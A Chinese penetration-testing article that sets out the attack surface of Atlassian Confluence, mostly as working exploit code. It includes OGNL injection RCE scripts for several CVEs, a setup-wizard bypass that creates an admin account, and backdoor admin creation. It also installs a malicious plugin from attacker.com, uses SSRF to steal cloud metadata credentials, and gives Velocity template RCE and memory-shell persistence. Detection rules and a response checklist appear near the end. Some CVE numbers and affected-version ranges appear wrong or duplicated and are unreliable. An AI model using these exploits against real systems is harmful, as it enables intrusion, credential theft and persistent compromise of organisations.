---
title: "Atlassian Confluence OGNL 注入 认证绕过 REST API SSRF 利用技术"
date: 2025-06-21T00:00:00+08:00
draft: false
weight: 108
description: "深入分析 Atlassian Confluence 的 OGNL 注入 RCE（CVE-2021-26084/CVE-2022-26134）、认证绕过（CVE-2023-22515）、REST API 未授权利用、SSRF 宏攻击、Velocity 模板注入、插件漏洞链、用户目录枚举等完整攻击面，覆盖历史 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Confluence","Atlassian","OGNL注入","CVE-2021-26084","CVE-2022-26134","CVE-2023-22515","认证绕过","REST_API","SSRF","模板注入","Velocity"]
---

## 0x00 攻击面总览

Atlassian Confluence 是企业级知识管理与协作平台的标杆产品，广泛用于技术文档、项目管理、知识沉淀。Confluence 的安全事件频发，多个高危 CVE 被在野利用，成为 APT 组织和勒索团伙的首选攻击目标。

| 攻击面 | 入口 | 风险等级 | 说明 |
|--------|------|---------|------|
| OGNL 注入 RCE | HTTP 请求 | **严重** | CVE-2021-26084/CVE-2022-26134，预认证 RCE |
| 认证绕过/提权 | Setup/REST API | **严重** | CVE-2023-22515，创建管理员账户 |
| REST API 未授权 | /rest/api/* | **高危** | 用户枚举、内容泄露、配置泄露 |
| SSRF via 宏 | Widget/RSS 宏 | **高危** | 内网探测、云元数据窃取 |
| Velocity 模板注入 | 空间/全局模板 | **高危** | SSTI 导致 RCE |
| 插件漏洞 | UPM 插件系统 | **中-高危** | 第三方插件引入新攻击面 |
| 用户目录枚举 | REST/登录接口 | **中危** | 用户名/邮箱/组织架构泄露 |
| 内存马注入 | OGNL RCE 后 | **严重** | Godzilla/Behinder 持久化 |

Confluence 的核心问题在于 WebWork 框架对 OGNL 表达式的不安全处理，以及 REST API 的过度暴露。从 2021 年至今，OGNL 注入漏洞反复出现，每次 Oracle/Atlassian 修复后攻击者都能找到新的注入点。

## 0x01 服务识别与版本探测

### 1.1 HTTP 指纹识别

```bash
nmap -sV -p 80,443,8090 --script=http-title,http-headers <target>

curl -sI http://TARGET:8090/
# X-Confluence-Request-Time: ...
# X-Confluence-ConfluenceVersion: 7.11.5

# 通过 login 页面获取版本
curl -s http://TARGET:8090/login.action | grep -i "confluence.version"

# 通过 REST API 获取版本
curl -s http://TARGET:8090/rest/api/settings/systemInfo | python3 -m json.tool
```

### 1.2 关键路径枚举

```
/login.action                          # 登录页面
/signup.action                         # 注册页面
/dologin.action                        # 登录处理
/setup/                                # 初始安装向导
/setup/setupdata.action                # 安装数据配置
/rest/api/user                         # 用户信息 API
/rest/api/content                      # 内容 API
/rest/api/space                        # 空间 API
/rest/api/longtask                     # 长任务 API
/rest/plugins/1.0/                     # 插件管理 API
/admin/console.action                  # 管理控制台
/admin/users/browseusers.action        # 用户浏览
/pages/doenterpagevariables.action     # OGNL 注入入口点
/templates/                            # 模板渲染路径
/display/                              # 空间展示路径
```

### 1.3 版本判断与漏洞映射

```python
import requests

def detect_confluence(host, port=8090):
    base_url = f"http://{host}:{port}"

    # 获取版本信息
    try:
        resp = requests.get(f"{base_url}/rest/api/settings/systemInfo", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            version = data.get("systemInfo", {}).get("version", "unknown")
            print(f"[+] Confluence Version: {version}")
    except:
        pass

    # 检查 setup 向导是否可用 (CVE-2023-22515)
    resp = requests.get(f"{base_url}/setup/setupdata.action", timeout=5,
                        allow_redirects=False)
    if resp.status_code == 200:
        print("[!] Setup wizard accessible — CVE-2023-22515 may be exploitable")

    # 检查 OGNL 注入入口
    resp = requests.get(f"{base_url}/pages/doenterpagevariables.action", timeout=5)
    if resp.status_code in [200, 405]:
        print("[+] OGNL injection endpoint exists")

    # 检查匿名访问
    resp = requests.get(f"{base_url}/rest/api/user?username=admin", timeout=5)
    if resp.status_code == 200:
        print("[+] Anonymous REST API access enabled")

detect_confluence("192.168.1.100")
```

## 0x02 OGNL 注入 RCE

### 2.1 CVE-2021-26084 — 首个 OGNL 注入 RCE

**CVSS**: 9.8（严重）

**影响版本**: Confluence Server < 6.13.23, 6.14.0 - 7.4.10, 7.11.0 - 7.11.5, 7.12.0 - 7.12.4

**漏洞原理**: Confluence 使用的 WebWork 框架通过 OGNL（Object-Graph Navigation Language）表达式引擎处理用户输入。`doenterpagevariables.action` 端点的 `pageTitle`、`queryString` 等参数未经过滤即传入 OGNL 求值器，攻击者可注入任意 OGNL 表达式执行系统命令。

**此漏洞为真正的 0-day**——在补丁发布前已被在野利用，CISA 发布了紧急指令。

**PoC — URI 路径注入**:

```bash
# 通过模板路径注入 OGNL 表达式执行命令
# URL 编码的 ${...} 表达式
curl -v "http://TARGET:8090/templates/default/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
```

**PoC — POST 参数注入**:

```python
import requests

def exploit_cve_2021_26084(host, port=8090, cmd="id"):
    base_url = f"http://{host}:{port}"

    # 方式一: 通过 doenterpagevariables.action POST 注入
    ognl_payload = (
        '${(#a=@org.apache.commons.io.IOUtils@toString('
        '@java.lang.Runtime@getRuntime().exec("' + cmd + '")'
        '.getInputStream(),"utf-8")).('
        '@com.opensymphony.webwork.ServletActionContext@getResponse()'
        '.setHeader("X-Cmd-Response",#a))}'
    )

    resp = requests.post(
        f"{base_url}/pages/doenterpagevariables.action",
        data={"pageTitle": ognl_payload},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )

    # 命令执行结果在响应头 X-Cmd-Response 中
    cmd_result = resp.headers.get("X-Cmd-Response", "")
    if cmd_result:
        print(f"[+] RCE Output: {cmd_result}")
    else:
        print(f"[-] No output in response header (status: {resp.status_code})")

exploit_cve_2021_26084("192.168.1.100", cmd="whoami")
```

### 2.2 CVE-2022-26134 — 第二个 OGNL 注入 RCE

**CVSS**: 9.8（严重）

**影响版本**: Confluence Server/Data Center < 7.4.17, 7.13.x < 7.13.7, 7.14.x < 7.14.3, 7.15.x < 7.15.2, 7.16.x < 7.16.4, 7.17.x < 7.17.4, 7.18.x < 7.18.1

**漏洞原理**: 与 CVE-2021-26084 类似但注入点不同。攻击者通过 URL 路径中的 `${...}` 表达式触发 OGNL 求值，影响范围更广（所有 Confluence 端点）。

**PoC**:

```bash
# 通过 URI 路径注入 — 最简形式
curl -v "http://TARGET:8090/%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%7D"

# 解码后的 OGNL 表达式:
# ${#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")}
```

```python
import requests
import urllib.parse

def exploit_cve_2022_26134(host, port=8090, cmd="id"):
    base_url = f"http://{host}:{port}"

    ognl_expr = (
        '${#a=@org.apache.commons.io.IOUtils@toString('
        '@java.lang.Runtime@getRuntime().exec("' + cmd + '")'
        '.getInputStream(),"utf-8").'
        '(@com.opensymphony.webwork.ServletActionContext@getResponse()'
        '.setHeader("X-Cmd-Output",#a))}'
    )

    encoded_expr = urllib.parse.quote(ognl_expr)
    url = f"{base_url}/{encoded_expr}"

    resp = requests.get(url, timeout=10, allow_redirects=False)
    output = resp.headers.get("X-Cmd-Output", "")

    if output:
        print(f"[+] RCE Output: {output}")
    else:
        print(f"[*] Status: {resp.status_code} (blind exploitation)")

exploit_cve_2022_26134("192.168.1.100", cmd="cat /etc/passwd")
```

### 2.3 OGNL 沙箱绕过技术

Atlassian 在每次 OGNL 漏洞后加强了沙箱限制，攻击者通过以下方式绕过：

```
绕过技术:
1. 使用 @java.lang.Runtime@getRuntime() 的替代调用方式
2. 通过 ProcessBuilder 替代 Runtime.exec()
3. 利用 OGNL 的 #context 访问内部对象绕过过滤
4. 通过 Class.forName() 动态加载类绕过类名黑名单
5. 使用反射链调用绕过方法名过滤
```

```python
# 使用 ProcessBuilder 替代 Runtime.exec()
ognl_processbuilder = (
    '${#pb=@java.lang.ProcessBuilder@java.lang.ProcessBuilder('
    '["/bin/bash","-c","' + cmd + '"]).start(),'
    '#s=@org.apache.commons.io.IOUtils@toString('
    '#pb.getInputStream(),"utf-8")}'
)

# 使用 Class.forName() 绕过类名黑名单
ognl_classforname = (
    '${#rt=@java.lang.Class@forName("java.lang.Runtime")'
    '.getMethod("getRuntime",null).invoke(null,null),'
    '#s=@org.apache.commons.io.IOUtils@toString('
    '#rt.exec("' + cmd + '").getInputStream(),"utf-8")}'
)
```

### 2.4 CVE-2023-22527 — 第三个 OGNL 注入 RCE

**CVSS**: 10.0（严重）

**影响版本**: Confluence Data Center < 7.19.15, 8.0.x < 8.3.4, 8.4.x < 8.4.3, 8.5.x < 8.5.2

**漏洞原理**: 在 CVE-2022-26134 修补后，攻击者发现了新的 OGNL 注入入口。此漏洞可通过 `json` 参数和 `setup` 路径触发，且与 CVE-2023-22515（认证绕过）组合可实现**零交互全自动 RCE**。

```python
import requests

def exploit_cve_2023_22527(host, port=8090, cmd="id"):
    base_url = f"http://{host}:{port}"

    # 通过 setup 路径触发 OGNL 注入
    ognl_payload = (
        '${(#rt=@java.lang.Runtime@getRuntime()'
        '.exec("' + cmd + '").getInputStream(),'
        '#out=@org.apache.commons.io.IOUtils@toString(#rt,"utf-8"))'
        '.(@com.opensymphony.webwork.ServletActionContext@getResponse()'
        '.setHeader("X-Result",#out))}'
    )

    resp = requests.post(
        f"{base_url}/json/setup-restore.action",
        data={"filename": ognl_payload},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )

    output = resp.headers.get("X-Result", "")
    print(f"[+] CVE-2023-22527 Output: {output}")

exploit_cve_2023_22527("192.168.1.100", cmd="whoami")
```

## 0x03 认证绕过与权限提升

### 3.1 CVE-2023-22515 — Setup 向导认证绕过

**CVSS**: 10.0（严重）

**影响版本**: Confluence Data Center < 7.19.15, 8.0.x < 8.3.4, 8.4.x < 8.4.3, 8.5.x < 8.5.2

**漏洞原理**: Confluence 的 Setup 向导（`/setup/setupdata.action`）在特定条件下可被未授权访问。攻击者利用此端点创建新的管理员账户，从而获取完整的系统管理权限。

**完整利用链**:

```python
import requests

def exploit_cve_2023_22515(host, port=8090):
    base_url = f"http://{host}:{port}"

    # Step 1: 检查 setup 向导是否可访问
    resp = requests.get(f"{base_url}/setup/setupdata.action",
                        allow_redirects=False, timeout=5)
    if resp.status_code != 200:
        print(f"[-] Setup wizard not accessible: {resp.status_code}")
        return False
    print("[+] Setup wizard accessible")

    # Step 2: 提交 setup 请求创建管理员用户
    setup_data = {
        "username": "hacker_admin",
        "password": "P@ssw0rd123!",
        "confirm": "P@ssw0rd123!",
        "fullName": "System Administrator",
        "email": "admin@target.local"
    }

    resp = requests.post(
        f"{base_url}/setup/setupadministrator.action",
        data=setup_data,
        allow_redirects=False,
        timeout=10
    )

    if resp.status_code in [200, 302]:
        print("[+] Admin user created successfully!")
        print("[+] Credentials: hacker_admin / P@ssw0rd123!")
        return True
    else:
        print(f"[-] Setup failed: {resp.status_code}")
        return False

    # Step 3: 使用新管理员账户登录
    # POST /dologin.action
    # os_username=hacker_admin&os_password=P@ssw0rd123!&login=Log+In

exploit_cve_2023_22515("192.168.1.100")
```

### 3.2 CVE-2023-22555 — 提权漏洞补充

**影响版本**: Confluence Data Center 8.0.x - 8.5.x

**漏洞原理**: 与 CVE-2023-22515 类似，通过不同的路径和参数组合实现管理员权限提升。

### 3.3 CVE-2024-21888 — 最新 OGNL 注入

**CVSS**: 10.0

**影响版本**: Confluence Data Center 8.5.x < 8.5.3

**漏洞原理**: 又一个 OGNL 注入点，通过 `setup-restore` 路径触发。

## 0x04 REST API 未授权利用

### 4.1 用户枚举

```bash
# 通过 REST API 枚举用户
curl -s "http://TARGET:8090/rest/api/user?username=admin" | python3 -m json.tool

# 批量枚举
for user in admin webmaster sysadmin operator; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET:8090/rest/api/user?username=$user")
    echo "$user: $status"
done

# 通过 CQL 搜索用户
curl -s "http://TARGET:8090/rest/api/user/search?cql=user%20~%20\"admin*\"" | python3 -m json.tool

# 浏览所有用户 (匿名访问开启时)
curl -s "http://TARGET:8090/users/listusers.action?username=a&show=all" | grep -o 'username=[^&"]*'
```

### 4.2 内容泄露

```bash
# 获取所有空间列表
curl -s "http://TARGET:8090/rest/api/space?limit=100" | python3 -m json.tool

# 获取指定空间的所有内容
curl -s "http://TARGET:8090/rest/api/content?spaceKey=CONF&limit=100&expand=body.storage,version" | python3 -m json.tool

# 搜索敏感内容
curl -s "http://TARGET:8090/rest/api/content/search?cql=type=page%20AND%20text~\"password\"" | python3 -m json.tool

# 获取页面附件
curl -s "http://TARGET:8090/rest/api/content/{pageId}/child/attachment" | python3 -m json.tool

# 获取页面评论 (可能包含敏感信息)
curl -s "http://TARGET:8090/rest/api/content/{pageId}/child/comment" | python3 -m json.tool
```

### 4.3 系统信息泄露

```bash
# 获取系统信息 (版本、JVM、OS 等)
curl -s "http://TARGET:8090/rest/api/settings/systemInfo" | python3 -m json.tool

# 获取集群节点信息 (Data Center 部署)
curl -s "http://TARGET:8090/rest/api/cluster/nodes" | python3 -m json.tool

# 获取全局设置
curl -s "http://TARGET:8090/rest/api/settings/lookandfeel" | python3 -m json.tool

# 获取邮件服务器配置 (可能包含 SMTP 凭据)
curl -s -u admin:password "http://TARGET:8090/rest/api/admin/mail" | python3 -m json.tool
```

### 4.4 管理员 API 滥用 (获取管理员权限后)

```python
import requests

def abuse_admin_api(host, port=8090, username="admin", password="admin"):
    base_url = f"http://{host}:{port}"
    auth = (username, password)

    # 创建后门管理员
    new_user = {
        "username": "backdoor_admin",
        "password": "B@ckd00r!",
        "fullName": "Backup Admin",
        "email": "backdoor@target.local"
    }
    resp = requests.post(f"{base_url}/rest/api/admin/users",
                         json=new_user, auth=auth, timeout=10)
    print(f"[*] Create user: {resp.status_code}")

    # 导出所有用户信息
    resp = requests.get(f"{base_url}/rest/api/admin/users?limit=1000",
                        auth=auth, timeout=10)
    if resp.status_code == 200:
        users = resp.json()
        print(f"[+] Found {len(users.get('results', []))} users")

    # 安装恶意插件
    plugin_data = {
        "pluginUri": "http://attacker.com:8888/malicious-plugin-1.0.jar"
    }
    resp = requests.post(f"{base_url}/rest/plugins/1.0/",
                         json=plugin_data, auth=auth,
                         headers={"Content-Type": "application/vnd.atl.plugins.remote.install+json"},
                         timeout=30)
    print(f"[*] Plugin install: {resp.status_code}")

abuse_admin_api("192.168.1.100")
```

## 0x05 SSRF via 宏与内容特性

### 5.1 可利用 SSRF 的宏

| 宏名称 | SSRF 向量 | 风险等级 |
|--------|----------|---------|
| Widget Connector | 获取外部 URL | 高 |
| RSS Feed Macro | 解析外部 RSS | 高 |
| External Gadgets | 加载外部 Gadget | 高 |
| Office Connector | 获取远程文档 | 高 |
| Include Page (远程) | 获取远程内容 | 中 |
| Chart Macro (data URL) | 获取外部数据源 | 中 |

### 5.2 SSRF via Widget Connector

```python
import requests

def exploit_ssrf_widget(host, port=8090, space_key="TEST",
                         ssrf_url="http://169.254.169.254/latest/meta-data/"):
    base_url = f"http://{host}:{port}"

    # 创建包含 SSRF 宏的页面
    page_data = {
        "type": "page",
        "title": "SSRF Test Page",
        "space": {"key": space_key},
        "body": {
            "storage": {
                "value": (
                    '<ac:structured-macro ac:name="widgetconnector">'
                    '<ac:parameter ac:name="url">' + ssrf_url + '</ac:parameter>'
                    '</ac:structured-macro>'
                ),
                "representation": "storage"
            }
        }
    }

    resp = requests.post(
        f"{base_url}/rest/api/content",
        json=page_data,
        headers={"Content-Type": "application/json"},
        timeout=15
    )

    if resp.status_code == 200:
        page_id = resp.json().get("id")
        print(f"[+] SSRF page created (ID: {page_id})")
        print(f"[*] View page: {base_url}/pages/viewpage.action?pageId={page_id}")

# 云元数据窃取
exploit_ssrf_widget("192.168.1.100",
                     ssrf_url="http://169.254.169.254/latest/meta-data/iam/security-credentials/")
```

### 5.3 云元数据窃取

```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ 获取临时 IAM 角色凭据 → 完全控制 AWS 账户

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
→ 获取服务账户 Token

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
→ 获取 VM 元数据和管理身份 Token
```

### 5.4 内网探测与横向移动

```python
# 通过 SSRF 探测内网服务
internal_targets = [
    "http://192.168.1.1:8080/",       # 内部 Jenkins
    "http://192.168.1.1:3306/",       # MySQL
    "http://192.168.1.1:6379/",       # Redis
    "http://10.0.0.1:9200/",          # Elasticsearch
    "http://10.0.0.1:8500/",          # Consul
    "http://10.0.0.1:2379/",          # etcd
    "http://internal-api.company.local/",  # 内部 API
]

for target in internal_targets:
    exploit_ssrf_widget("192.168.1.100", ssrf_url=target)
```

## 0x06 Velocity 模板注入 (SSTI)

### 6.1 模板注入入口

| 入口点 | 权限要求 | 持久性 |
|--------|---------|--------|
| 空间模板 | 空间管理员 | 空间级 |
| 全局模板 | 系统管理员 | 全局 |
| 邮件模板 | 系统管理员 | 全局 |
| 自定义装饰器 | 系统管理员 | 全局 |
| 空间自定义 HTML | 空间管理员 | 空间级 |

### 6.2 Velocity SSTI RCE

```velocity
#set($s="")
#set($runtime=$s.class.forName("java.lang.Runtime"))
#set($rt=$runtime.getMethod("getRuntime",null).invoke(null,null))
#set($exec=$rt.exec("id"))
#set($is=$exec.getInputStream())
#set($scanner=$s.class.forName("java.util.Scanner").getConstructor($is.getClass()).newInstance($is))
#set($out=$scanner.useDelimiter("\\A").next())
$out
```

### 6.3 通过管理员权限注入恶意模板

```python
import requests

def inject_velocity_template(host, port=8090, cmd="id",
                              username="admin", password="admin"):
    base_url = f"http://{host}:{port}"

    # 创建包含恶意 Velocity 代码的页面模板
    template_data = {
        "templateId": {"templateName": "malicious-template"},
        "name": "System Template",
        "templateKey": "confluence:malicious",
        "body": {
            "storage": {
                "value": (
                    '#set($rt=$content.class.forName("java.lang.Runtime")'
                    '.getMethod("getRuntime",null).invoke(null,null))'
                    '#set($out=$rt.exec("' + cmd + '").getInputStream())'
                    '#set($s=$content.class.forName("java.util.Scanner")'
                    '.getConstructor($out.getClass()).newInstance($out))'
                    '$s.useDelimiter("\\\\A").next()'
                ),
                "representation": "storage"
            }
        }
    }

    resp = requests.post(
        f"{base_url}/rest/api/template",
        json=template_data,
        auth=(username, password),
        headers={"Content-Type": "application/json"},
        timeout=15
    )

    print(f"[*] Template injection status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"[+] Malicious template created — use it to trigger RCE")

inject_velocity_template("192.168.1.100", cmd="whoami")
```

### 6.4 邮件模板持久化后门

```
攻击链:
1. CVE-2023-22515 → 获取管理员权限
2. 注入恶意 Velocity 代码到全局邮件模板
3. 当任何用户触发邮件通知时 (如页面更新、评论)
4. 模板渲染触发 RCE
5. 持久后门 — 即使修改密码也无法清除
```

## 0x07 插件漏洞利用

### 7.1 恶意插件安装

```bash
# 通过 UPM (Universal Plugin Manager) 安装恶意插件
curl -X POST "http://TARGET:8090/rest/plugins/1.0/" \
  -u admin:admin \
  -H "Content-Type: application/vnd.atl.plugins.remote.install+json" \
  -d '{"pluginUri":"http://attacker.com:8888/malicious-plugin-1.0.jar"}'

# 恶意插件可以包含:
# - Java Servlet (反弹 Shell)
# - OGNL Webshell
# - 通过插件生命周期钩子实现持久化
```

### 7.2 已知高危插件漏洞

| 插件 | 漏洞类型 | 影响 |
|------|---------|------|
| Scroll PDF Exporter | 路径穿越 | 本地文件读取 |
| Questions for Confluence | SQL 注入 | 数据库泄露 |
| Run CLI | 命令注入 | RCE |
| Handy Macros | SSRF | 内网探测 |
| Team Calendars | 认证绕过 | 未授权访问 |

### 7.3 插件 Velocity 模板注入

```velocity
# 如果插件通过 Velocity 渲染用户可控内容:
#set($runtime = $content.class.forName("java.lang.Runtime"))
#set($rt = $runtime.getMethod("getRuntime", null).invoke(null, null))
#set($proc = $rt.exec("id"))
#set($out = $content.class.forName("org.apache.commons.io.IOUtils"))
$out.toString($proc.getInputStream(), "utf-8")
```

## 0x08 内存马注入

### 8.1 Confluence Filter 内存马

```python
# 通过 OGNL RCE 注入 Filter 内存马
# 核心思路: 通过 OGNL 表达式获取 ServletContext，注册恶意 Filter

ognl_memory_shell = """
#context=@com.opensymphony.webwork.ServletActionContext@getContext(),
#servletContext=#context.getServletContext(),
#filterManager=#servletContext.getAttribute("com.atlassian.confluence.servlet.FilterManager"),
# 通过反射注册恶意 Filter 到所有请求路径
"""

# 建议使用 Godzilla/Behinder 等成熟框架的 Confluence 专用内存马模块
# 注入后通过特定请求头/参数触发命令执行
```

### 8.2 持久化技术

```
持久化方式:
1. Filter/Servlet 内存马 — 无文件，重启消失
2. 恶意插件安装 — 持久化，重启后自动加载
3. 邮件模板后门 — 隐蔽，触发式执行
4. Webshell 写入 — 写入 Confluence Web 目录
5. Crontab/Systemd — 系统级持久化
```

## 0x09 历史 CVE 漏洞时间线

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-26084 | 2021 | 9.8 | OGNL 注入 | 预认证 RCE，0-day 在野利用 |
| CVE-2022-26134 | 2022 | 9.8 | OGNL 注入 | URI 路径注入 RCE |
| CVE-2023-22515 | 2023 | 10.0 | 认证绕过 | Setup 向导创建管理员 |
| CVE-2023-22527 | 2023 | 10.0 | OGNL 注入 | setup-restore 路径 RCE |
| CVE-2023-22555 | 2023 | 10.0 | 提权 | 管理员权限提升 |
| CVE-2024-21888 | 2024 | 10.0 | OGNL 注入 | 最新 OGNL 注入 RCE |

**规律总结**: Confluence 的 OGNL 注入漏洞呈现"修复→新注入点→再修复"的循环。WebWork 框架的 OGNL 处理机制是根本问题，每次修复只封堵特定注入点，攻击者总能找到新的表达式求值入口。

## 0x10 组合攻击链

### 10.1 攻击链一: 认证绕过 + RCE (Waterhog)

```
CVE-2023-22515 (Setup 认证绕过)
    ↓ 创建管理员账户
CVE-2023-22527 (OGNL 注入 RCE)
    ↓ 执行任意命令
内存马/恶意插件 → 持久化
```

### 10.2 攻击链二: SSRF + 云凭据窃取

```
SSRF via Widget Connector
    ↓ 访问云元数据服务
窃取 IAM 临时凭据
    ↓ 完全控制云账户
横向移动至 S3/RDS/EC2
```

### 10.3 攻击链三: 用户枚举 + 凭据填充 + 提权

```
REST API 用户枚举
    ↓ 获取有效用户名列表
凭据填充/密码喷洒
    ↓ 获取低权限用户访问
CVE-2023-22515 提权
    ↓ 升级为管理员
完整系统控制
```

### 10.4 已知威胁组织 TTP

| 威胁组织 | 类型 | 使用的 Confluence CVE |
|---------|------|---------------------|
| Storm-0062 | 国家级 APT | CVE-2021-26084, CVE-2022-26134 |
| FIN11 | 网络犯罪 | CVE-2022-26134 初始访问 |
| LockBit | 勒索软件 | CVE-2022-26134 初始访问 |
| Conti | 勒索软件 | 多个 Confluence CVE |
| UNC2546 | 网络犯罪 | Waterhog 链数据窃取 |

## 0x11 蓝队检测与应急响应

### 11.1 网络层检测规则

```
# OGNL 注入特征
alert tcp any any -> any 8090 (msg:"Confluence OGNL Injection"; content:"${"; content:"Runtime"; nocase; sid:3000001;)
alert tcp any any -> any 8090 (msg:"Confluence OGNL ProcessBuilder"; content:"ProcessBuilder"; nocase; sid:3000002;)
alert tcp any any -> any 8090 (msg:"Confluence OGNL IOUtils"; content:"IOUtils"; content:"toString"; nocase; sid:3000003;)

# Setup 向导异常访问
alert tcp any any -> any 8090 (msg:"Confluence Setup Access"; content:"/setup/setupdata"; nocase; sid:3000004;)
alert tcp any any -> any 8090 (msg:"Confluence Setup Admin"; content:"/setup/setupadministrator"; content:"POST"; nocase; sid:3000005;)

# OGNL 变量入口
alert tcp any any -> any 8090 (msg:"Confluence OGNL Endpoint"; content:"doenterpagevariables"; nocase; sid:3000006;)

# SSRF 云元数据探测
alert tcp any any -> any 8090 (msg:"SSRF Cloud Metadata"; content:"169.254.169.254"; sid:3000007;)
```

### 11.2 日志分析

```bash
# 检查 OGNL 注入攻击
grep -i "Runtime\|ProcessBuilder\|IOUtils\|getRuntime" access.log
grep "doenterpagevariables" access.log
grep "%24%7B" access.log  # URL 编码的 ${

# 检查 Setup 向导滥用
grep "/setup/" access.log | grep -v "internal_ip"

# 检查 REST API 异常
grep "/rest/api/user?username=" access.log | sort | uniq -c | sort -rn
grep "/rest/api/content?spaceKey=" access.log

# 检查 SSRF 尝试
grep "169.254.169.254" access.log
grep "metadata.google.internal" access.log

# 检查异常插件安装
grep "/rest/plugins/" access.log | grep "POST"

# 检查 Velocity 模板注入
grep -i "class.forName\|getMethod\|invoke" access.log
```

### 11.3 应急响应清单

```
[ ] 确认 Confluence 版本与已安装补丁
    - 管理控制台 → 系统信息
    - 对比 Atlassian 安全公告

[ ] 检查 OGNL 注入攻击痕迹
    - 搜索 access.log 中的 ${ 和 %24%7B
    - 检查 doenterpagevariables 访问记录
    - 检查模板路径中的异常请求

[ ] 检查 Setup 向导滥用
    - 搜索 /setup/ 路径的访问记录
    - 检查是否有异常管理员账户创建
    - 审查管理员用户列表

[ ] 排查 SSRF 攻击
    - 搜索 169.254.169.254 访问
    - 检查 Widget Connector 宏的使用记录
    - 审查新建页面中的外部 URL 引用

[ ] 检查内存马与持久化
    - 使用 Arthas 检查异常 Filter/Servlet
    - 审查已安装插件列表
    - 检查邮件模板是否被篡改

[ ] 网络隔离与补丁修复
    - 应用 Atlassian 最新安全补丁
    - 禁用匿名访问 (如不需要)
    - 限制 Confluence 为内网访问
    - 部署 WAF 配置 OGNL 注入规则
```

## 0x12 安全审计清单

```
[ ] Confluence 版本为最新稳定版，已应用所有安全补丁
[ ] Setup 向导在生产环境中已禁用
[ ] 匿名访问已关闭或严格限制
[ ] REST API 访问需要认证
[ ] 部署 WAF 并配置 OGNL 注入检测规则
[ ] 监控管理员账户创建/修改事件
[ ] 定期审查已安装插件，移除不必要的第三方插件
[ ] SSRF 防护: 禁止 Widget/RSS 宏访问内网地址和云元数据
[ ] 邮件服务器凭据加密存储
[ ] 配置 access.log 远程收集与实时告警
[ ] 启用 Confluence Audit Logging 记录所有管理操作
[ ] 定期检查 Velocity 模板是否被篡改
[ ] 限制 Confluence 服务器的出站网络访问
```

## 0x13 总结

Atlassian Confluence 的安全态势可以用"OGNL 注入永无止境"来形容。从 CVE-2021-26084 到 CVE-2024-21888，OGNL 注入漏洞反复出现，根本原因在于 WebWork 框架的 OGNL 处理机制存在设计缺陷。

核心攻击面归纳为四大类：

1. **OGNL 注入 RCE**: 预认证远程代码执行，是最高危的攻击向量，已被多个 APT 组织和勒索团伙利用
2. **认证绕过/提权**: Setup 向导和 REST API 的认证缺陷，可快速获取管理员权限
3. **SSRF + 云攻击**: 通过宏功能实现 SSRF，窃取云凭据实现横向移动
4. **模板注入 + 持久化**: Velocity SSTI 和恶意插件提供持久化后门能力

防守方核心策略：
- **及时补丁**: Atlassian 安全公告发布后第一时间更新
- **最小化暴露**: 禁用匿名访问、Setup 向导、不必要的 REST API
- **WAF 防护**: 配置 OGNL 注入检测规则，拦截 `${` 和编码变体
- **纵深防御**: 网络隔离 + 运行时监控 + 内存马检测 + 插件审计
- **云安全**: 使用 IMDSv2 替代 IMDSv1，限制 SSRF 可达的元数据服务
